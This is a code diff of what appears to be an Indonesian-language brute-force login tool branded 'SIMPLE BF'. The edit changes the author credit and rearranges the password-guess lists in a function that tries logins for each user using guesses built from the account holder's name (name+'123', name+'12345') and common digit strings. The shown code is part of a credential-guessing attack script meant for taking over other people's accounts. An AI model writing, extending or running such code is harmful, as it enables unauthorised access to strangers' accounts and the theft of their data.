@@ -19,7 +19,7 @@ except ImportError:
 	print("\n ! module dukungan belum terinstall")
 	os.system("pip2 install ipaddress")
 
-import os, sys, re, time, requests, calendar, ipaddress
+import os, sys, re, time, requests, calendar, ipaddress, random
 from multiprocessing.pool import ThreadPool as Th
 from bs4 import BeautifulSoup as parser
 from datetime import datetime
@@ -61,7 +61,7 @@ def random_ipv6():
 
 def logo():
 	os.system("clear")
-	print(" \033[0;91m ___ ___ __  __ ___ _    ___   ___ ___  \n \033[0;91m/ __|_ _|  \/  | _ \ |  | __| | _ ) __| \n \033[0;97m\__ \| || |\/| |  _/ |__| _|  | _ \ _|  \n \033[0;97m|___/___|_|  |_|_| |____|___| |___/_| BY ALZWAGE \n")
+	print(" \033[0;91m ___ ___ __  __ ___ _    ___   ___ ___  \n \033[0;91m/ __|_ _|  \/  | _ \ |  | __| | _ ) __| \n \033[0;97m\__ \| || |\/| |  _/ |__| _|  | _ \ _|  \n \033[0;97m|___/___|_|  |_|_| |____|___| |___/_| BY Ahmed Az\n")
 
 def login():
 	os.system("clear")
@@ -411,13 +411,13 @@ def mobile(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name+"123", name+"1234", name+"12345", "112233445566" ]
+		pwx = [ name+"123", name+"1234", name+"12345", "1122334455" ]
 	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345", "123456654321" ]
+		pwx = [ name+"123", name+"1234", name+"12345", "1234554321" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345", "1122334455" ]
+		pwx = [ name+"123", name+"12345", "112233445566" ]
 	else:
-		pwx = [ name+"123", name+"12345", "1234554321" ]
+		pwx = [ name+"123", name+"12345", "123456654321" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
